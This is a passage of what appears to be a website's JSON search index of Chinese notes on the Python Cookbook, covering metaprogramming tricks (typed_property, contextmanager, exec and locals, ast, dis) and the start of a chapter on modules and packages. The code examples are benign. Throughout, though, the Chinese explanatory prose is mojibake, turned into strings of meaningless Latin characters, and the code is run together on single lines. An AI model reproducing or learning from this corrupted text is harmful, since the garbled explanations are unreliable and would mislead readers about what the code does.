ns.update(cls_dict)) new_class() ç¬¬å››ä¸ªå‚æ•°ï¼Œç”¨æ¥æ¥å—ç±»å‘½åç©ºé—´çš„æ˜ å°„å¯¹è±¡çš„å‡½ æ•°ã€‚é€šå¸¸è¿™æ˜¯ä¸€ä¸ªæ™®é€šçš„å­—å…¸ï¼Œä½†æ˜¯å®ƒå®é™…ä¸Šæ˜¯ __prepare__() æ–¹æ³•è¿”å›çš„ä»»æ„å¯¹è±¡ï¼Œ è®¨è®º å¾ˆ å¤š æ—¶ å€™ å¦‚ æœ èƒ½ æ„ é€  æ–° çš„ ç±» å¯¹ è±¡ æ˜¯ å¾ˆ æœ‰ ç”¨ çš„ã€‚æœ‰ ä¸ª å¾ˆ ç†Ÿ æ‚‰ çš„ ä¾‹ å­ æ˜¯ è°ƒ ç”¨ collections.namedtuple() å‡½æ•° namedtuple() ä½¿ç”¨ exec() è€Œä¸æ˜¯ä¸Šé¢ä»‹ç»çš„æŠ€æœ¯ åœ¨å®šä¹‰çš„æ—¶å€™åˆå§‹åŒ–ç±»çš„æˆå‘˜ åˆ©ç”¨å‡½æ•°æ³¨è§£å®ç°æ–¹æ³•é‡è½½ é—®é¢˜ ä½ å·²ç»å­¦è¿‡æ€æ ·ä½¿ç”¨å‡½æ•°å‚æ•°æ³¨è§£ï¼Œé‚£ä¹ˆä½ å¯èƒ½ä¼šæƒ³åˆ©ç”¨å®ƒæ¥å®ç°åŸºäºç±»å‹çš„æ–¹ æ³•é‡è½½ã€‚ä½†æ˜¯ä½ ä¸ç¡®å®šåº”è¯¥æ€æ ·å»å®ç°ï¼ˆæˆ–è€…åˆ°åº•è¡Œå¾—é€šä¸ï¼‰ã€‚ è§£å†³æ–¹æ¡ˆ åŸºäºä¸€ä¸ªç®€å•çš„æŠ€æœ¯: Python å…è®¸å‚æ•°æ³¨è§£ å¦‚: class Spam: def bar(self, x:int, y:int): print('Bar 1:', x, y) def bar(self, s:str, n:int = 0): print('Bar 2:', s, n) s = Spam() s.bar(2, 3) # Prints Bar 1: 2 3 s.bar('hello') # Prints Bar 2: hello 0 å¾—ä½¿ç”¨inspectæ£€æŸ¥ç„¶ååˆ¤æ–­ç”¨å“ªä¸ª. ä¸è¡¨. é¿å…é‡å¤çš„å±æ€§æ–¹æ³• é—®é¢˜ ä½ åœ¨ç±»ä¸­éœ€è¦é‡å¤çš„å®šä¹‰ä¸€äº›æ‰§è¡Œç›¸åŒé€»è¾‘çš„å±æ€§æ–¹æ³•ï¼Œæ¯”å¦‚è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œæ€æ · å»ç®€åŒ–è¿™äº›é‡å¤ä»£ç å‘¢ è§£å†³æ–¹æ¡ˆ ä½¿ç”¨è‡ªå®šä¹‰å‡½æ•° å¦‚é‡å¤çš„å±æ€§è®¿é—®å™¨: class Person: def __init__(self, name ,age): self.name = name self.age = age @property def name(self): return self._name @name.setter def name(self, value): if not isinstance(value, str): raise TypeError('name must be a string') self._name = value @property def age(self): return self._age @age.setter def age(self, value): if not isinstance(value, int): raise TypeError('age must be an int') self._age = value å¯ä»¥ä½¿ç”¨å‡½æ•°ç®€åŒ–: def typed_property(name, expected_type): storage_name = '_' + name @property def prop(self): return getattr(self, storage_name) @prop.setter def prop(self, value): if not isinstance(value, expected_type): raise TypeError('{} must be a {}'.format(name, expected_type)) setattr(self, storage_name, value) return prop ä½¿ç”¨: # Example use class Person: name = typed_property('name', str) age = typed_property('age', int) def __init__(self, name, age): self.name = name self.age = age è®¨è®º å‡½æ•° typed_property() çœ‹ä¸Šå»æœ‰ç‚¹éš¾ç†è§£ï¼Œå…¶å®å®ƒæ‰€åšçš„ä»…ä»…å°±æ˜¯ä¸ºä½ ç”Ÿæˆå±æ€§å¹¶ è¿”å›è¿™ä¸ªå±æ€§å¯¹è±¡ã€‚å› æ­¤ï¼Œå½“åœ¨ä¸€ä¸ªç±»ä¸­ä½¿ç”¨å®ƒçš„æ—¶å€™ï¼Œæ•ˆæœè·Ÿå°†å®ƒé‡Œé¢çš„ä»£ç æ”¾åˆ° ç±»å®šä¹‰ä¸­å»æ˜¯ä¸€æ ·çš„ã€‚ è¿˜å¯ä»¥ä½¿ç”¨ functools.partial() æ¥ç¨ç¨æ”¹å˜ä¸‹: from functools import partial String = partial(typed_property, expected_type=str) Integer = partial(typed_property, expected_type=int) # Example: class Person: name = String('name') age = Integer('age') def __init__(self, name, age): self.name = name self.age = age å®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„ç®€å•æ–¹æ³• é—®é¢˜ ä½ æƒ³è‡ªå·±å»å®ç°ä¸€ä¸ªæ–°çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œä»¥ä¾¿ä½¿ç”¨ with è¯­å¥ã€‚ è§£å†³æ–¹æ¡ˆ å®ç°ä¸€ä¸ªæ–°çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ä½¿ç”¨ contexlib æ¨¡å—ä¸­çš„ @contextmanager è£…é¥°å™¨ å¦‚: import time from contextlib import contextmanager @contextmanager def timethis(label): start = time.time() try: yield finally: end = time.time() print('{}: {}'.format(label, end - start)) # Example use with timethis('counting'): n = 10000000 while n > 0: n -= 1 åœ¨å‡½æ•° timethis() ä¸­ï¼Œyield ä¹‹å‰çš„ä»£ç ä¼šåœ¨ä¸Šä¸‹æ–‡ç®¡ç†å™¨ä¸­ä½œä¸º __enter__() æ–¹æ³•æ‰§è¡Œï¼Œæ‰€æœ‰åœ¨ yield ä¹‹åçš„ä»£ç ä¼šä½œä¸º __exit__() æ–¹æ³•æ‰§è¡Œã€‚å¦‚æœå‡ºç°äº†å¼‚å¸¸ï¼Œ å¼‚å¸¸ä¼šåœ¨ yield è¯­å¥é‚£é‡ŒæŠ›å‡ºã€‚ æ›´åŠ é«˜çº§ä¸€ç‚¹çš„ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼Œå®ç°äº†åˆ—è¡¨å¯¹è±¡ä¸Šçš„æŸç§äº‹åŠ¡: @contextmanager def list_transaction(orig_list): working = list(orig_list) yield working orig_list[:] = working @contextmanager åº”è¯¥ä»…ä»…ç”¨æ¥å†™è‡ªåŒ…å«çš„ä¸Šä¸‹æ–‡ç®¡ç†å‡½æ•°ã€‚å¦‚æœä½ æœ‰ä¸€äº›å¯¹ è±¡ (æ¯”å¦‚ä¸€ä¸ªæ–‡ä»¶ã€ç½‘ç»œè¿æ¥æˆ–é”)ï¼Œéœ€è¦æ”¯æŒ with è¯­å¥ï¼Œé‚£ä¹ˆä½ å°±éœ€è¦å•ç‹¬å®ç° __enter__() æ–¹æ³•å’Œ __exit__() æ–¹æ³•ã€‚ åœ¨å±€éƒ¨å˜é‡åŸŸä¸­æ‰§è¡Œä»£ç  é—®é¢˜ ä½ æƒ³åœ¨ä½¿ç”¨èŒƒå›´å†…æ‰§è¡ŒæŸä¸ªä»£ç ç‰‡æ®µï¼Œå¹¶ä¸”å¸Œæœ›åœ¨æ‰§è¡Œåæ‰€æœ‰çš„ç»“æœéƒ½ä¸å¯è§ ä¸ºäº†ç†è§£è¿™ä¸ªé—®é¢˜ï¼Œå…ˆè¯•è¯•ä¸€ä¸ªç®€å•åœºæ™¯ã€‚é¦–å…ˆï¼Œåœ¨å…¨å±€å‘½åç©ºé—´å†…æ‰§è¡Œä¸€ä¸ªä»£ç  ç‰‡æ®µ: >>> a = 13 >>> exec('b = a + 1') >>> print(b) 14 >>> ç„¶åï¼Œå†åœ¨ä¸€ä¸ªå‡½æ•°ä¸­æ‰§è¡ŒåŒæ ·çš„ä»£ç : >>> def test(): ... a = 13 ... exec('b = a + 1') ... print(b) ... >>> test() Traceback (most recent call last): File \"<stdin>\", line 1, in <module> File \"<stdin>\", line 4, in test NameError: global name 'b' is not defined >>> ä¸ºäº†ä¿®æ­£è¿™æ ·çš„é”™è¯¯ï¼Œä½ éœ€è¦åœ¨è°ƒç”¨ exec() ä¹‹å‰ä½¿ç”¨ locals() å‡½æ•°æ¥å¾—åˆ°ä¸€ä¸ª å±€éƒ¨å˜é‡å­—å…¸ã€‚ä¹‹åä½ å°±èƒ½ä»å±€éƒ¨å­—å…¸ä¸­è·å–ä¿®æ”¹è¿‡åçš„å˜é‡å€¼äº†: >>> def test(): ... a = 13 ... loc = locals() ... exec('b = a + 1') ... b = loc['b'] ... print(b) ... >>> test() 14 >>> è®¨è®º å®é™…ä¸Šå¯¹äº exec() çš„æ­£ç¡®ä½¿ç”¨æ˜¯æ¯”è¾ƒéš¾çš„ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹å½“ä½ è¦è€ƒè™‘ä½¿ç”¨ exec() çš„æ—¶å€™ï¼Œè¿˜æœ‰å¦å¤–æ›´å¥½çš„è§£å†³æ–¹æ¡ˆï¼ˆæ¯”å¦‚è£…é¥°å™¨ã€é—­åŒ…ã€å…ƒç±»ç­‰ç­‰ï¼‰ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œexec() ä¼šåœ¨è°ƒç”¨è€…å±€éƒ¨å’Œå…¨å±€èŒƒå›´å†…æ‰§è¡Œä»£ç ã€‚ç„¶è€Œï¼Œåœ¨å‡½æ•°é‡Œé¢ï¼Œä¼ é€’ç»™ exec() çš„å±€éƒ¨èŒƒå›´æ˜¯æ‹·è´å®é™…å±€éƒ¨å˜é‡ç»„æˆçš„ä¸€ä¸ªå­—å…¸ã€‚å› æ­¤ï¼Œå¦‚æœ exec() å¦‚æœæ‰§ è¡Œäº†ä¿®æ”¹æ“ä½œï¼Œè¿™ç§ä¿®æ”¹åçš„ç»“æœå¯¹å®é™…å±€éƒ¨å˜é‡å€¼æ˜¯æ²¡æœ‰å½±å“çš„: >>> def test1(): ... x = 0 ... exec('x += 1') ... print(x) ... >>> test1() 0 >>> å¦ä¸€ä¸ªæ¼”ç¤ºä¾‹å­: >>> def test2(): ... x = 0 ... loc = locals() ... print('before:', loc) ... exec('x += 1') ... print('after:', loc) ... print('x =', x) ... >>> test2() before: {'x': 0} after: {'loc': {...}, 'x': 1} x = 0 >>> ä»”ç»†è§‚å¯Ÿæœ€åä¸€æ­¥çš„è¾“å‡ºï¼Œé™¤éä½ å°† loc ä¸­è¢«ä¿®æ”¹åçš„å€¼æ‰‹åŠ¨èµ‹å€¼ç»™ xï¼Œå¦åˆ™ x å˜é‡å€¼æ˜¯ä¸ä¼šå˜çš„ã€‚ åœ¨ä½¿ç”¨ locals() çš„æ—¶å€™ï¼Œä½ éœ€è¦æ³¨æ„æ“ä½œé¡ºåºã€‚æ¯æ¬¡å®ƒè¢«è°ƒç”¨çš„æ—¶å€™ï¼Œlocals() ä¼šè·å–å±€éƒ¨å˜é‡å€¼ä¸­çš„å€¼å¹¶è¦†ç›–å­—å…¸ä¸­ç›¸åº”çš„å˜é‡ã€‚ ä½œä¸º locals() çš„ä¸€ä¸ªæ›¿ä»£æ–¹æ¡ˆï¼Œä½ å¯ä»¥ä½¿ç”¨ä½ è‡ªå·±çš„å­—å…¸ï¼Œå¹¶å°†å®ƒä¼ é€’ç»™ exec() ã€‚ä¾‹å¦‚: >>> def test4(): ... a = 13 ... loc = { 'a' : a } ... glb = { } ... exec('b = a + 1', glb, loc) ... b = loc['b'] ... print(b) ... >>> test4() 14 >>> è§£æä¸åˆ†æ Python æºç  é—®é¢˜ ä½ æƒ³å†™è§£æå¹¶åˆ†æ Python æºä»£ç çš„ç¨‹åº è§£å†³æ–¹æ¡ˆ å¤§éƒ¨åˆ†ç¨‹åºå‘˜çŸ¥é“ Python èƒ½å¤Ÿè®¡ç®—æˆ–æ‰§è¡Œå­—ç¬¦ä¸²å½¢å¼çš„æºä»£ç : >>> x = 42 >>> eval('2 + 3*4 + x') 56 >>> exec('for i in range(10): print(i)') # 0123456789 >>> ast æ¨¡å—èƒ½è¢«ç”¨æ¥å°† Python æºç ç¼–è¯‘æˆä¸€ä¸ªå¯è¢«åˆ†æçš„æŠ½è±¡è¯­æ³•æ ‘ ï¼ˆASTï¼‰ã€‚ ä¾‹å¦‚: >>> import ast >>> ex = ast.parse('2 + 3*4 + x', mode='eval') >>> ex <_ast.Expression object at 0x1007473d0> >>> ast.dump(ex) \"Expression(body=BinOp(left=BinOp(left=Num(n=2), op=Add(), right=BinOp(left=Num(n=3), op=Mult(), right=Num(n=4))), op=Add(), right=Name(id='x', ctx=Load())))\" >>> top = ast.parse('for i in range(10): print(i)', mode='exec') >>> top <_ast.Module object at 0x100747390> >>> ast.dump(top) \"Module(body=[For(target=Name(id='i', ctx=Store()), iter=Call(func=Name(id='range', ctx=Load()), args=[Num(n=10)], keywords=[], starargs=None, kwargs=None), body=[Expr(value=Call(func=Name(id='print', ctx=Load()), args=[Name(id='i', ctx=Load())], keywords=[], starargs=None, kwargs=None))], orelse=[])])\" >>> åˆ†ææºç æ ‘éœ€è¦ä½ è‡ªå·±æ›´å¤šçš„å­¦ä¹ ï¼Œå®ƒæ˜¯ç”±ä¸€ç³»åˆ— AST èŠ‚ç‚¹ç»„æˆçš„ã€‚åˆ†æè¿™äº›èŠ‚ç‚¹ æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯å®šä¹‰ä¸€ä¸ªè®¿é—®è€…ç±»ï¼Œå®ç°å¾ˆå¤š visit_NodeName() æ–¹æ³•ï¼ŒNodeName() åŒ¹é…é‚£äº›ä½ æ„Ÿå…´è¶£çš„èŠ‚ç‚¹ã€‚ ä¾‹å¦‚, è‡ªå®šä¹‰è®°å½•äº†å“ªäº›åå­—è¢«åŠ è½½ã€å­˜å‚¨å’Œåˆ é™¤çš„ä¿¡æ¯ç±»: import ast class CodeAnalyzer(ast.NodeVisitor): def __init__(self): self.loaded = set() self.stored = set() self.deleted = set() def visit_Name(self, node): if isinstance(node.ctx, ast.Load): self.loaded.add(node.id) elif isinstance(node.ctx, ast.Store): self.stored.add(node.id) elif isinstance(node.ctx, ast.Del): self.deleted.add(node.id) # Sample usage if __name__ == '__main__': # Some Python code code = ''' for i in range(10): print(i) del i ''' # Parse into an AST top = ast.parse(code, mode='exec') # Feed the AST to analyze name usage c = CodeAnalyzer() c.visit(top) æœ€åï¼ŒAST å¯ä»¥é€šè¿‡ compile() å‡½æ•°æ¥ç¼–è¯‘å¹¶æ‰§è¡Œã€‚ä¾‹å¦‚: >>> exec(compile(top,'<stdin>', 'exec')) æ‹†è§£ Python å­—èŠ‚ç  é—®é¢˜ ä½ æƒ³é€šè¿‡å°†ä½ çš„ä»£ç åç¼–è¯‘æˆä½çº§çš„å­—èŠ‚ç æ¥æŸ¥çœ‹å®ƒåº•å±‚çš„å·¥ä½œæœºåˆ¶ã€‚ è§£å†³æ–¹æ¡ˆ dis æ¨¡å—å¯ä»¥è¢«ç”¨æ¥è¾“å‡ºä»»ä½• Python å‡½æ•°çš„åç¼–è¯‘ç»“æœã€‚ä¾‹å¦‚: >>> def countdown(n): ... while n > 0: ... print('T-minus', n) ... n -= 1 ... print('Blastoff!') ... >>> import dis >>> dis.dis(countdown) ... >>> è®¨è®º å½“ä½ æƒ³è¦çŸ¥é“ä½ çš„ç¨‹åºåº•å±‚çš„è¿è¡Œæœºåˆ¶çš„æ—¶å€™ï¼Œdis æ¨¡å—æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚æ¯”å¦‚å¦‚æœä½  æƒ³è¯•ç€ç†è§£æ€§èƒ½ç‰¹å¾ã€‚è¢« dis() å‡½æ•°è§£æçš„åŸå§‹å­—èŠ‚ç å¦‚ä¸‹æ‰€ç¤º: >>> countdown.__code__.co_code b\"x'\\x00|\\x00\\x00d\\x01\\x00k\\x04\\x00r)\\x00t\\x00\\x00d\\x02\\x00|\\x00\\x00\\x83 \\x02\\x00\\x01|\\x00\\x00d\\x03\\x008}\\x00\\x00q\\x03\\x00Wt\\x00\\x00d\\x04\\x00\\x83 \\x01\\x00\\x01d\\x00\\x00S\" >>> å¦‚æœä½ æƒ³è‡ªå·±è§£é‡Šè¿™æ®µä»£ç ï¼Œä½ éœ€è¦ä½¿ç”¨ä¸€äº›åœ¨ opcode æ¨¡å—ä¸­å®šä¹‰çš„å¸¸é‡ã€‚ä¾‹å¦‚: >>> c = countdown.__code__.co_code >>> import opcode >>> opcode.opname[c[0]] >>> opcode.opname[c[0]] 'SETUP_LOOP' >>> opcode.opname[c[3]] 'LOAD_FAST' >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-Metad-programming.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-Metad-programming.html"},{"title":"æ¨¡å—ä¸åŒ…","text":"æ¨¡å—ä¸åŒ…æ˜¯ä»»ä½•å¤§å‹ç¨‹åºçš„æ ¸å¿ƒï¼Œå°±è¿ Python å®‰è£…ç¨‹åºæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªåŒ…ã€‚æœ¬ç« é‡ ç‚¹æ¶‰åŠæœ‰å…³æ¨¡å—å’ŒåŒ…çš„å¸¸ç”¨ç¼–ç¨‹æŠ€æœ¯ï¼Œä¾‹å¦‚å¦‚ä½•ç»„ç»‡åŒ…ã€æŠŠå¤§å‹æ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶ã€ åˆ›å»ºå‘½åç©ºé—´åŒ…ã€‚åŒæ—¶ï¼Œä¹Ÿç»™å‡ºäº†è®©ä½ è‡ªå®šä¹‰å¯¼å…¥è¯­å¥çš„ç§˜ç±ã€‚ æ„å»ºä¸€ä¸ªæ¨¡å—çš„å±‚çº§åŒ… é—®é¢˜ ä½ æƒ³å°†ä½ çš„ä»£ç ç»„ç»‡æˆç”±å¾ˆå¤šåˆ†å±‚æ¨¡å—æ„æˆçš„åŒ… è§£å†³æ–¹æ¡ˆ å°è£…æˆåŒ…æ˜¯å¾ˆç®€å•çš„ã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸Šç»„ç»‡ä½ çš„ä»£ç ï¼Œå¹¶ç¡®ä¿æ¯ä¸ªç›®å½•éƒ½å®šä¹‰äº†ä¸€ä¸ª __init__.py æ–‡ä»¶ã€‚ä¾‹å¦‚: graphics/ __init__.py primitive/ __init__.py line.py fill.py text.py formats/ __init__.py png.py jpg.py ä¸€æ—¦ä½ åšåˆ°äº†è¿™ä¸€ç‚¹ï¼Œä½ åº”è¯¥èƒ½å¤Ÿæ‰§è¡Œå„ç§ import è¯­å¥ï¼Œå¦‚ä¸‹: import graphics.primitive.line from graphics.primitive import line import graphics.formats.jpg as jpg ç»å¤§éƒ¨åˆ†æ—¶å€™è®© __init__.py ç©ºç€å°±å¥½ã€‚ä½†æ˜¯æœ‰äº›æƒ…å†µä¸‹å¯èƒ½åŒ…å«ä»£ç , å¦‚å­æ¨¡å—åŠ è½½: # graphics/formats/__init__.py from . import jpg from . import png æ•é”çš„ç¨‹åºå‘˜ä¼šå‘ç°ï¼Œå³ä½¿æ²¡æœ‰ __init__.py æ–‡ä»¶å­˜åœ¨ï¼Œpython ä»ç„¶ä¼šå¯¼å…¥åŒ…ã€‚ å¦‚æœä½ æ²¡æœ‰å®šä¹‰ __init__.py æ—¶ï¼Œå®é™…ä¸Šåˆ›å»ºäº†ä¸€ä¸ªæ‰€è°“çš„\"å‘½åç©ºé—´åŒ…\". æ§åˆ¶æ¨¡å—è¢«å…¨éƒ¨å¯¼å…¥çš„å†…å®¹ é—®é¢˜ å½“ä½¿ç”¨ from module import * è¯­å¥æ—¶ï¼Œå¸Œæœ›å¯¹ä»æ¨¡å—æˆ–åŒ…å¯¼å‡ºçš„ç¬¦å·è¿›è¡Œç²¾ç¡® æ§åˆ¶ã€‚ è§£å†³æ–¹æ¡ˆ åœ¨ä½ çš„æ¨¡å—ä¸­å®šä¹‰ä¸€ä¸ªå˜é‡ __all__ æ¥æ˜ç¡®åœ°åˆ—å‡ºéœ€è¦å¯¼å‡ºçš„å†…å®¹ã€‚ ä¸¾ä¾‹: # somemodule.py def spam(): pass def grok(): pass blah = 42 # Only export 'spam' and 'grok' __all__ = ['spam', 'grok'] è®¨è®º å°½ç®¡å¼ºçƒˆåå¯¹ä½¿ç”¨ from module import * , ä½†æ˜¯åœ¨å®šä¹‰äº†å¤§é‡å˜é‡åçš„æ¨¡å—ä¸­ é¢‘ç¹ä½¿ç”¨ã€‚å¦‚æœä½ ä¸åšä»»ä½•äº‹, è¿™æ ·çš„å¯¼å…¥å°†ä¼šå¯¼å…¥æ‰€æœ‰ä¸ä»¥ä¸‹åˆ’çº¿å¼€å¤´çš„ã€‚å¦ä¸€æ–¹é¢, å¦‚æœå®šä¹‰äº†__all__, é‚£ä¹ˆåªæœ‰è¢«åˆ—ä¸¾å‡ºçš„ä¸œè¥¿ä¼šè¢«å¯¼å‡ºã€‚ å¦‚æœä½ å°† __all__ å®šä¹‰æˆä¸€ä¸ªç©ºåˆ—è¡¨, æ²¡æœ‰ä¸œè¥¿å°†è¢«å¯¼å…¥ã€‚å¦‚æœ __all__ åŒ…å«æœª å®šä¹‰çš„åå­—, åœ¨å¯¼å…¥æ—¶å¼•èµ· AttributeErrorã€‚ ä½¿ç”¨ç›¸å¯¹è·¯å¾„åå¯¼å…¥åŒ…ä¸­å­æ¨¡å— é—®é¢˜ å°†ä»£ç ç»„ç»‡æˆåŒ…, æƒ³ç”¨ import è¯­å¥ä»å¦ä¸€ä¸ªåŒ…åæ²¡æœ‰ç¡¬ç¼–ç è¿‡çš„åŒ…çš„ä¸­å¯¼å…¥å­æ¨¡ å—ã€‚ ç›¸å¯¹å¯¼å…¥åªé€‚ç”¨äºåœ¨åˆé€‚çš„åŒ…ä¸­çš„æ¨¡å—ã€‚å°¤å…¶æ˜¯åœ¨é¡¶å±‚çš„è„šæœ¬çš„ç®€å•æ¨¡å— ä¸­ï¼Œå®ƒä»¬å°†ä¸èµ·ä½œç”¨ã€‚å¦‚æœåŒ…çš„éƒ¨åˆ†è¢«ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼Œé‚£å®ƒä»¬å°†ä¸èµ·ä½œç”¨ å¦ä¸€æ–¹é¢ï¼Œå¦‚æœä½ ä½¿ç”¨ Python çš„-m é€‰é¡¹æ¥æ‰§è¡Œå…ˆå‰çš„è„šæœ¬ï¼Œç›¸å¯¹å¯¼å…¥å°†ä¼šæ­£ç¡® è¿è¡Œã€‚ å°†æ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶ é—®é¢˜ ä½ æƒ³å°†ä¸€ä¸ªæ¨¡å—åˆ†å‰²æˆå¤šä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯ä½ ä¸æƒ³å°†åˆ†ç¦»çš„æ–‡ä»¶ç»Ÿä¸€æˆä¸€ä¸ªé€»è¾‘æ¨¡å— æ—¶ä½¿å·²æœ‰çš„ä»£ç é­åˆ°ç ´åã€‚ ä¸¾ä¾‹, åŸæœ‰ä»£ç : # mymodule.py class A: def spam(self): print('A.spam') class B(A): def bar(self): print('B.bar') å‡è®¾ä½ æƒ³ mymodule.py åˆ†ä¸ºä¸¤ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸ªå®šä¹‰çš„ä¸€ä¸ªç±», é¦–å…ˆ ç”¨ mymodule ç›®å½•æ¥æ›¿æ¢æ–‡ä»¶ mymodule.pyã€‚è¿™è¿™ä¸ªç›®å½•ä¸‹ï¼Œåˆ›å»ºä»¥ä¸‹æ–‡ä»¶: mymodule/ __init__.py a.py b.py åœ¨ a.py æ–‡ä»¶ä¸­æ’å…¥ä»¥ä¸‹ä»£ç : # a.py class A: def spam(self): print('A.spam') åœ¨ b.py æ–‡ä»¶ä¸­æ’å…¥ä»¥ä¸‹ä»£ç : # b.py from .a import A class B(A): def bar(self): print('B.bar') æœ€åï¼Œåœ¨ __init__.py ä¸­ï¼Œå°† 2 ä¸ªæ–‡ä»¶ç²˜åˆåœ¨ä¸€èµ·: # __init__.py from .a import A from .b import B å¦‚æœæŒ‰ç…§è¿™äº›æ­¥éª¤ï¼Œæ‰€äº§ç”Ÿçš„åŒ… MyModule å°†ä½œä¸ºä¸€ä¸ªå•ä¸€çš„é€»è¾‘æ¨¡å—: >>> import mymodule >>> a = mymodule.A() >>> a.spam() A.spam >>> b = mymodule.B() >>> b.bar() B.bar >>> è®¨è®º åœ¨è¿™ä¸ªç« èŠ‚ä¸­çš„ä¸»è¦é—®é¢˜æ˜¯ä¸€ä¸ªè®¾è®¡é—®é¢˜ï¼Œä¸ç®¡ä½ æ˜¯å¦å¸Œæœ›ç”¨æˆ·ä½¿ç”¨å¾ˆå¤šå°æ¨¡å— æˆ–åªæ˜¯ä¸€ä¸ªæ¨¡å—ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œåœ¨ä¸€ä¸ªå¤§å‹çš„ä»£ç åº“ä¸­ï¼Œä½ å¯ä»¥å°†è¿™ä¸€åˆ‡éƒ½åˆ†å‰²æˆç‹¬ç«‹çš„ æ–‡ä»¶ï¼Œè®©ç”¨æˆ·ä½¿ç”¨å¤§é‡çš„ import è¯­å¥ï¼Œå°±åƒè¿™æ ·: from mymodule.a import A from mymodule.b import B ... è¿™æ ·èƒ½å·¥ä½œï¼Œä½†è¿™è®©ç”¨æˆ·æ‰¿å—æ›´å¤šçš„è´Ÿæ‹…ï¼Œç”¨æˆ·è¦çŸ¥é“ä¸åŒçš„éƒ¨åˆ†ä½äºä½•å¤„ã€‚é€šå¸¸ æƒ…å†µä¸‹ï¼Œå°†è¿™äº›ç»Ÿä¸€èµ·æ¥ï¼Œä½¿ç”¨ä¸€æ¡ import å°†æ›´åŠ å®¹æ˜“ï¼Œå°±åƒè¿™æ ·: from mymodule import A, B å¯¹åè€…è€Œè¨€ï¼Œè®© mymodule æˆä¸ºä¸€ä¸ªå¤§çš„æºæ–‡ä»¶æ˜¯æœ€å¸¸è§çš„ã€‚ å½“ä¸€ä¸ªæ¨¡å—è¢«åˆ†å‰²ï¼Œä½ éœ€è¦ç‰¹åˆ«æ³¨æ„äº¤å‰å¼•ç”¨çš„æ–‡ä»¶å. æ•´ä¸ªç« èŠ‚éƒ½ä½¿ç”¨åŒ…çš„ç›¸å¯¹å¯¼å…¥æ¥é¿å…å°†é¡¶å±‚æ¨¡å—åç¡¬ç¼–ç åˆ°æºä»£ç ä¸­. å»¶è¿Ÿå¯¼å…¥ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œ__init__.py æ–‡ä»¶ä¸€æ¬¡å¯¼å…¥æ‰€ æœ‰å¿…éœ€çš„ç»„ä»¶çš„ã€‚ä½†æ˜¯å¯¹äºä¸€ä¸ªå¾ˆå¤§çš„æ¨¡å—ï¼Œå¯èƒ½ä½ åªæƒ³ç»„ä»¶åœ¨éœ€è¦æ—¶è¢«åŠ è½½ã€‚è¦åšåˆ° è¿™ä¸€ç‚¹ï¼Œ__init__.py æœ‰ç»†å¾®çš„å˜åŒ–: # __init__.py def A(): from .a import A return A() def B(): from .b import B return B() å»¶è¿ŸåŠ è½½çš„ä¸»è¦ç¼ºç‚¹æ˜¯ç»§æ‰¿å’Œç±»å‹æ£€æŸ¥å¯èƒ½ä¼šä¸­æ–­ åˆ©ç”¨å‘½åç©ºé—´å¯¼å…¥ç›®å½•åˆ†æ•£çš„ä»£ç  é—®é¢˜ ä½ å¯èƒ½æœ‰å¤§é‡çš„ä»£ç ï¼Œç”±ä¸åŒçš„äººæ¥åˆ†æ•£åœ°ç»´æŠ¤ã€‚æ¯ä¸ªéƒ¨åˆ†è¢«ç»„ç»‡ä¸ºæ–‡ä»¶ç›®å½•ï¼Œå¦‚ ä¸€ä¸ªåŒ…ã€‚ç„¶è€Œï¼Œä½ å¸Œæœ›èƒ½ç”¨å…±åŒçš„åŒ…å‰ç¼€å°†æ‰€æœ‰ç»„ä»¶è¿æ¥èµ·æ¥ï¼Œä¸æ˜¯å°†æ¯ä¸€ä¸ªéƒ¨åˆ†ä½œä¸º ç‹¬ç«‹çš„åŒ…æ¥å®‰è£…ã€‚ è§£å†³æ–¹æ¡ˆ ä»æœ¬è´¨ä¸Šè®²ï¼Œä½ è¦å®šä¹‰ä¸€ä¸ªé¡¶çº§ Python åŒ…ï¼Œä½œä¸ºä¸€ä¸ªå¤§é›†åˆåˆ†å¼€ç»´æŠ¤å­åŒ…çš„å‘½å ç©ºé—´ã€‚è¿™ä¸ªé—®é¢˜ç»å¸¸å‡ºç°åœ¨å¤§çš„åº”ç”¨æ¡†æ¶ä¸­ï¼Œæ¡†æ¶å¼€å‘è€…å¸Œæœ›é¼“åŠ±ç”¨æˆ·å‘å¸ƒæ’ä»¶æˆ–é™„åŠ  åŒ…ã€‚ åœ¨ç»Ÿä¸€ä¸åŒçš„ç›®å½•é‡Œç»Ÿä¸€ç›¸åŒçš„å‘½åç©ºé—´ï¼Œä½†æ˜¯è¦åˆ å»ç”¨æ¥å°†ç»„ä»¶è”åˆèµ·æ¥çš„ __init__.py æ–‡ä»¶ã€‚å‡è®¾ä½ æœ‰ Python ä»£ç çš„ä¸¤ä¸ªä¸åŒçš„ç›®å½•å¦‚ä¸‹: foo-package/ spam/ blah.py bar-package/ spam/ grok.py è®©æˆ‘ä»¬çœ‹çœ‹ï¼Œå¦‚æœå°† foo-package å’Œ bar-package éƒ½åŠ åˆ° python æ¨¡å—è·¯å¾„å¹¶å°è¯•å¯¼ å…¥ä¼šå‘ç”Ÿä»€ä¹ˆ: >>> import sys >>> sys.path.extend(['foo-package', 'bar-package']) >>> import spam.blah >>> import spam.grok >>> ä¸¤ä¸ªä¸åŒçš„åŒ…ç›®å½•è¢«åˆå¹¶åˆ°ä¸€èµ·ï¼Œä½ å¯ä»¥å¯¼å…¥ spam.blah å’Œ spam.grokï¼Œå¹¶ä¸”å®ƒä»¬ 